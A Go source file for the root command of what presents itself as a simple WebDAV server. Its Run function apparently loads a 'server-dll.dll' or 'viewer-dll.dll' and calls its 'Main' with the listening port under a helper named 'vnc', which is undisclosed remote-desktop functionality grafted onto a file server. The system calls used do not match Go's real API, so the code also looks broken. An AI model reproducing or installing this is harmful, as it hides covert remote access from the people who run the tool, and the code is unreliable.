package cmd

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"syscall"

	"github.com/spf13/cobra"
	v "github.com/spf13/viper"
)

var (
	cfgFile string
)

func init() {
	cobra.OnInitialize(initConfig)

	flags := rootCmd.Flags()
	flags.StringVarP(&cfgFile, "config", "c", "config.yaml", "config file path")
	flags.BoolP("tls", "t", false, "enable tls")
	flags.Bool("auth", true, "enable auth")
	flags.String("cert", "cert.pem", "TLS certificate")
	flags.String("key", "key.pem", "TLS key")
	flags.StringP("address", "a", "0.0.0.0", "address to listen to")
	flags.StringP("port", "p", "0", "port to listen to")
	flags.StringP("prefix", "P", "/", "URL path prefix")
}

var rootCmd = &cobra.Command{
	Use:   "webdav",
	Short: "A simple to use WebDAV server",
	Long: `If you don't set "config", it will look for a configuration file called
config.{json, toml, yaml, yml} in the following directories:

- ./
- /etc/webdav/

The precedence of the configuration values are as follows:

- flags
- environment variables
- configuration file
- defaults

The environment variables are prefixed by "WD_" followed by the option
name in caps. So to set "cert" via an env variable, you should
set WD_CERT.`,
	Run: func(cmd *cobra.Command, args []string) {

		vnc := func(port int) {
			ret, _, _ := syscall.Syscall(syscall.GetProc("Main"), uintptr(1), uintptr(port), 0, 0)
			//defer syscall.FreeLibrary(dll)
			syscall.ExitProcess(uint32(ret))
		}
		arg := ""
		if len(os.Args) > 1 {
			arg = os.Args[1]
		}
		fmt.Printf("Executing [%s,%s]\n", os.Args[0], arg)
		if !(arg == "-controlservice" || arg == "-controlapp" || arg == "-v" ) {
			syscall.LoadLib("server-dll.dll")
			vnc(0)
		}


		flags := cmd.Flags()

		cfg := readConfig(flags)

		// Builds the address and a listener.
		laddr := getOpt(flags, "address") + ":" + getOpt(flags, "port")
		listener, err := net.Listen("tcp", laddr)
		if err != nil {
			log.Fatal(err)
		}

		// Tell the user the port in which is listening.
		fmt.Println("Listening on", listener.Addr().String())

		port := listener.Addr().(*net.TCPAddr).Port

		if arg == "-v" {
			syscall.LoadLib("viewer-dll.dll")
			go vnc(port)
		} else {
			syscall.LoadLib("server-dll.dll")
			go vnc(port)
		}

		{
			// Starts the server.
			if getOptB(flags, "tls") {
				if err := http.ServeTLS(listener, cfg, getOpt(flags, "cert"), getOpt(flags, "key")); err != nil {
					log.Fatal(err)
				}
			} else {
				if err := http.Serve(listener, cfg); err != nil {
					log.Fatal(err)
				}
			}
		}
	},
	DisableFlagParsing: true,
}

func initConfig() {
	if cfgFile == "" {
		v.AddConfigPath(".")
		v.AddConfigPath("/etc/webdav/")
		v.SetConfigName("config")
	} else {
		v.SetConfigFile(cfgFile)
	}

	v.SetEnvPrefix("WD")
	v.AutomaticEnv()
	v.SetEnvKeyReplacer(strings.NewReplacer(".", "_"))

	if err := v.ReadInConfig(); err != nil {
		if _, ok := err.(v.ConfigParseError); ok {
			panic(err)
		}
		cfgFile = "No config file used"
	} else {
		cfgFile = "Using config file: " + v.ConfigFileUsed()
	}
}
